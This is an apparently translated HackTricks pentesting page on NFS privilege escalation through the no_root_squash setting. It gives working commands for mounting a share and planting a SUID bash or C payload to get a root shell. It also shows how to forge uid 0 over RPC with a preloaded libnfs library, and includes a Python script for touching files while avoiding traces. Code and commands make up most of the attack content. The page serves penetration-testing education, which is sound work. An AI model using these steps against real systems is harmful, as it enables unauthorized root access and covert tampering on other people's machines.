{{#include ../../banners/hacktricks-training.md}}

# Squashing Basic Info

NFS 通常（特别是在 Linux 中）会信任连接到文件的客户端指定的 `uid` 和 `gid`（如果未使用 kerberos）。然而，服务器上可以设置一些配置来**改变这种行为**：

- **`all_squash`**：它会将所有访问映射到**`nobody`**（65534 无符号 / -2 有符号）。因此，所有人都是 `nobody`，没有用户被使用。
- **`root_squash`/`no_all_squash`**：这是 Linux 的默认设置，**仅对 uid 0（root）进行压缩**。因此，任何 `UID` 和 `GID` 都被信任，但 `0` 被压缩为 `nobody`（因此无法进行 root 冒充）。
- **`no_root_squash`**：如果启用此配置，甚至不会压缩 root 用户。这意味着如果你以此配置挂载一个目录，你可以作为 root 访问它。

在 **/etc/exports** 文件中，如果你发现某个目录被配置为 **no_root_squash**，那么你可以**作为客户端访问**它，并**像本地机器的 root 一样在该目录中写入**。

有关 **NFS** 的更多信息，请查看：

{{#ref}}
/network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Privilege Escalation

## Remote Exploit

选项 1 使用 bash：
- **在客户端机器上挂载该目录**，并**作为 root 复制** `/bin/bash` 二进制文件到挂载文件夹中，并赋予其 **SUID** 权限，然后**从受害者**机器执行该 bash 二进制文件。
- 请注意，要在 NFS 共享中成为 root，**`no_root_squash`** 必须在服务器上配置。
- 然而，如果未启用，你可以通过将二进制文件复制到 NFS 共享并以你想要提升的用户身份赋予 SUID 权限来提升到其他用户。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
选项 2 使用 C 编译代码：
- **在客户端机器上挂载该目录**，并 **以 root 身份复制** 我们的编译好的有效载荷到挂载文件夹中，该有效载荷将滥用 SUID 权限，赋予其 **SUID** 权限，并 **从受害者** 机器执行该二进制文件（您可以在这里找到一些 [C SUID 有效载荷](payloads-to-execute.md#c)）。
- 与之前相同的限制
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> 注意，如果您可以从您的机器创建一个**到受害者机器的隧道，您仍然可以使用远程版本来利用此权限提升，隧道所需的端口**。\
> 以下技巧适用于文件`/etc/exports` **指示一个IP**的情况。在这种情况下，您**无论如何都无法使用** **远程利用**，您需要**利用这个技巧**。\
> 另一个使利用能够工作的必要条件是**`/etc/export`中的导出** **必须使用`insecure`标志**。\
> --_我不确定如果`/etc/export`指示一个IP地址，这个技巧是否有效_--

## Basic Information

该场景涉及在本地机器上利用挂载的NFS共享，利用NFSv3规范中的一个缺陷，该缺陷允许客户端指定其uid/gid，可能导致未经授权的访问。利用涉及使用[libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造NFS RPC调用的库。

### Compiling the Library

库的编译步骤可能需要根据内核版本进行调整。在这种特定情况下，fallocate系统调用被注释掉。编译过程涉及以下命令：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 进行利用

利用涉及创建一个简单的 C 程序 (`pwn.c`)，该程序提升权限到 root，然后执行一个 shell。程序被编译，生成的二进制文件 (`a.out`) 被放置在具有 suid root 的共享上，使用 `ld_nfs.so` 在 RPC 调用中伪造 uid：

1. **编译利用代码：**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **将漏洞放置在共享上并通过伪造 uid 修改其权限：**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **执行漏洞利用以获取根权限：**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell for Stealthy File Access

一旦获得 root 访问权限，为了在不更改所有权的情况下与 NFS 共享进行交互（以避免留下痕迹），使用一个 Python 脚本（nfsh.py）。该脚本调整 uid 以匹配正在访问的文件的 uid，从而允许在共享上与文件进行交互，而不会出现权限问题：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
运行如下：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
